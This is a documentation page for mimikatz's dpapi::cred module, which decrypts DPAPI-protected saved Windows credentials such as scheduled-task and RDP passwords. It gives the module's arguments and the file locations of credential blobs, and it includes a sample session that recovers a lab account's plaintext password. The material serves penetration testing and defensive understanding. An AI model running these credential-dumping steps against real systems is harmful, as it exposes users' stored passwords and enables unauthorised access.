# cred

`dpapi::cred` decrypts DPAPI saved credential such as RDP, Scheduled tasks, etc (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad-ds/movement/credentials/dumping/dpapi-protected-secrets)). It has the following command line arguments:

* `/in`: the file path to decrypt. The file locations are `C:\Users\<UserName>\AppData\Local\Microsoft\Credentials\<credential_blob>\` and `C:\Users\<UserName>\AppData\Roaming\Microsoft\Credentials\<credential_blob>\`. Tools like [Seatbelt ](https://github.com/GhostPack/Seatbelt)come in handy for enumerating credential blob files' location
* `/lsaiso`: [In Windows, the LSAISO process runs as **an Isolated User Mode (IUM) process** in a new security environment that is known as Virtual Secure Mode (VSM).](https://docs.microsoft.com/en-us/troubleshoot/windows-client/performance/lsaiso-process-high-cpu-usage) It is used when Credentials Guard is in place
* `/masterkey`: the masterkey to use for decryption. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi).
* `/password`: the password to decrypt the blob
* `/unprotect`: displays the decryption results on screen

The following example was taken from Benjamin's [howto \~ scheduled tasks credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-\~-scheduled-tasks-credentials) guide, which displays the content of the credential file:

```
mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {5d4e7e0d-d922-4783-8efc-9319b45b1c9a}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000046 - 70
  szDescription      : Données d’identification locales
[...]
Decrypting Credential:
 * volatile cache: GUID:{5d4e7e0d-d922-4783-8efc-9319b45b1c9a};KeyHash:ba02ef86f26c683858d3df3dc961e37b0d47e574
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000fe - 254
  credUnk0       : 00004004 - 16388

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 03/01/2017 21:31:30
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:batch=TaskScheduler:Task:{813565C4-C976-4E78-A1CA-8BDAE749E965}
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : LAB\\admin
  CredentialBlob : waza1234/a
  Attributes     : 0
```
